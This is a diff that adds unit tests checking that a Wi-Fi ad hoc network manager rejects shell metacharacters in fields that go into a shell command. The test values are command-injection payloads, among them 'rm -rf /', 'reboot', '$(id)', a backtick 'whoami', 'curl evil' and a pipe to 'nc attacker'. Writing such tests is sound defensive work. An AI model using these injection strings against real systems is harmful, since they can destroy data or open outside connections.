@@ -228,6 +228,108 @@ describe('Adhoc Manager Functions', function () {
         done()
       })
     })
+
+    // S10 defense-in-depth: metachar-bearing values must be rejected at the
+    // manager boundary (before /bin/sh sees them), not just by routes/adhoc.ts.
+    // Each field that gets interpolated into the chained shell command is
+    // exercised with a distinct payload.
+    it('should reject a shell metacharacter in the device when activating', function (done) {
+      settings.clear()
+      const adhoc = new AdhocManager(settings)
+      adhoc.setAdapter(true, 'wlan0; reboot', {
+        ipaddress: '192.168.1.10', wpaType: 'wep', password: 'Hello', ssid: 'dronenet', band: 'bg', channel: 1, gateway: '192.168.1.1'
+      }, (err) => {
+        assert.ok(err instanceof Error)
+        assert.ok(/metacharacter/i.test(err.message))
+        // rejected before persisting: no device was saved
+        assert.equal(settings.value('adhoc.device', 'unset'), 'unset')
+        done()
+      })
+    })
+
+    it('should reject a shell metacharacter in the ssid when activating', function (done) {
+      settings.clear()
+      const adhoc = new AdhocManager(settings)
+      adhoc.setAdapter(true, 'wlan0', {
+        ipaddress: '192.168.1.10', wpaType: 'wep', password: 'Hello', ssid: "net' ; rm -rf / #", band: 'bg', channel: 1, gateway: '192.168.1.1'
+      }, (err) => {
+        assert.ok(err instanceof Error)
+        assert.ok(/metacharacter/i.test(err.message))
+        done()
+      })
+    })
+
+    it('should reject a shell metacharacter in the wep password when activating', function (done) {
+      settings.clear()
+      const adhoc = new AdhocManager(settings)
+      adhoc.setAdapter(true, 'wlan0', {
+        ipaddress: '192.168.1.10', wpaType: 'wep', password: 'p$(id)', ssid: 'dronenet', band: 'bg', channel: 1, gateway: '192.168.1.1'
+      }, (err) => {
+        assert.ok(err instanceof Error)
+        assert.ok(/metacharacter/i.test(err.message))
+        done()
+      })
+    })
+
+    it('should reject a shell metacharacter in the ipaddress when activating', function (done) {
+      settings.clear()
+      const adhoc = new AdhocManager(settings)
+      adhoc.setAdapter(true, 'wlan0', {
+        ipaddress: '1.2.3.4 && curl evil', wpaType: 'wep', password: 'Hello', ssid: 'dronenet', band: 'bg', channel: 1, gateway: '192.168.1.1'
+      }, (err) => {
+        assert.ok(err instanceof Error)
+        assert.ok(/metacharacter/i.test(err.message))
+        done()
+      })
+    })
+
+    it('should reject a shell metacharacter in the gateway when activating', function (done) {
+      settings.clear()
+      const adhoc = new AdhocManager(settings)
+      adhoc.setAdapter(true, 'wlan0', {
+        ipaddress: '192.168.1.10', wpaType: 'wep', password: 'Hello', ssid: 'dronenet', band: 'bg', channel: 1, gateway: '1.2.3.4`whoami`'
+      }, (err) => {
+        assert.ok(err instanceof Error)
+        assert.ok(/metacharacter/i.test(err.message))
+        done()
+      })
+    })
+
+    it('should reject a shell metacharacter in the channel when activating', function (done) {
+      settings.clear()
+      const adhoc = new AdhocManager(settings)
+      adhoc.setAdapter(true, 'wlan0', {
+        ipaddress: '192.168.1.10', wpaType: 'wep', password: 'Hello', ssid: 'dronenet', band: 'bg', channel: '1 | nc attacker 9', gateway: '192.168.1.1'
+      }, (err) => {
+        assert.ok(err instanceof Error)
+        assert.ok(/metacharacter/i.test(err.message))
+        done()
+      })
+    })
+
+    it('should reject a shell metacharacter in the device when deactivating', function (done) {
+      settings.clear()
+      const adhoc = new AdhocManager(settings)
+      adhoc.setAdapter(false, 'wlan0 && reboot', { }, (err) => {
+        assert.ok(err instanceof Error)
+        assert.ok(/metacharacter/i.test(err.message))
+        done()
+      })
+    })
+
+    it('should not check the password when the network is open', function (done) {
+      // wpaType 'none' means the password clause is never emitted, so a value
+      // there never reaches the shell and is (correctly) not checked - proves
+      // the guard mirrors the command string rather than over-rejecting.
+      settings.clear()
+      const adhoc = new AdhocManager(settings)
+      adhoc.setAdapter(true, 'wlan0', {
+        ipaddress: '192.168.1.10', wpaType: 'none', password: 'p$(id)', ssid: 'dronenet', band: 'bg', channel: 1, gateway: ''
+      }, (err) => {
+        assert.equal(err, null)
+        done()
+      })
+    })
   })
 
   describe('#constructor()', function () {
